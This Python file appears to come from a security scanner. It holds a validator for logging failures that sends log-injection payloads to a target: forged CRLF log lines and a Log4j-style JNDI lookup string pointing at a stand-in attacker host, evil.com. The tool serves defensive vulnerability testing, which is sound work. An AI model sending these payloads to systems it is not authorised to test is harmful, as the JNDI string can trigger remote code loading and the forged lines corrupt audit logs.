# =============================================================================
# A09: LOGGING FAILURES VALIDATOR (unchanged)
# =============================================================================
import re
import time
import urllib.parse
from typing import Optional, Dict, Tuple

from .base import (
    BaseValidator,
    ValidationResult,
    ValidationReport,
    VulnReport,
)

class A09_LoggingValidator(BaseValidator):
    """
    Validates:
    - Missing logging
    - Log injection
    - Insufficient monitoring
    
    Note: This is the hardest to validate externally as we can't see server logs
    """
    
    async def validate(self, vuln: VulnReport) -> ValidationReport:
        vuln_subtype = vuln.vuln_type.upper()
        
        if "INJECTION" in vuln_subtype:
            return await self._validate_log_injection(vuln)
        else:
            return await self._validate_logging_inference(vuln)
    
    async def _validate_log_injection(self, vuln: VulnReport) -> ValidationReport:
        """Check for log injection vulnerability"""
        try:
            # Try to inject log entries
            log_payloads = [
                "\n[CRITICAL] Fake log entry\n",
                "\r\n[ERROR] Injected log\r\n",
                "${jndi:ldap://evil.com/a}",  # Log4j style
            ]
            
            for payload in log_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                status, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                # We can't actually verify log injection externally
                # but we can check if the payload is processed
                if status == 200:
                    return ValidationReport(
                        result=ValidationResult.MEDIUM,
                        confidence=0.5,
                        evidence="Log injection payload accepted - manual verification needed",
                        validation_method="Log Injection",
                        details={"payload": payload[:50], "note": "Cannot verify server-side logs externally"}
                    )
            
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence="Cannot verify logging externally",
                validation_method="Log Injection"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="Log Injection"
            )
    
    async def _validate_logging_inference(self, vuln: VulnReport) -> ValidationReport:
        """Infer logging issues from observable behavior"""
        # A09 is inherently difficult to validate externally
        return ValidationReport(
            result=ValidationResult.MEDIUM,
            confidence=0.5,
            evidence="Logging failures reported - requires access to server logs to verify",
            validation_method="Logging Check",
            details={"note": "A09 requires server-side access for definitive validation"}
        )